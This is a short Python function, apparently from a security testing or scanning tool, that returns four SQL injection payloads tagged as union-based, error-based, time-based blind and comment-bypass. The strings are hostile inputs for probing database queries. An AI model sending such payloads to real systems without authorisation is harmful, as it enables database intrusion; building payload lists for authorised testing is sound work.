def get_sqli_payloads():
    return [
        {"type": "Union-Based", "payload": "' UNION SELECT null--"},
        {"type": "Error-Based", "payload": "'+(SELECT 1/0)+'"},
        {"type": "Blind", "payload": "' AND SLEEP(5)--"},
        {"type": "Comment Bypass", "payload": "' /*!UNION*/ SELECT--"},
    ]
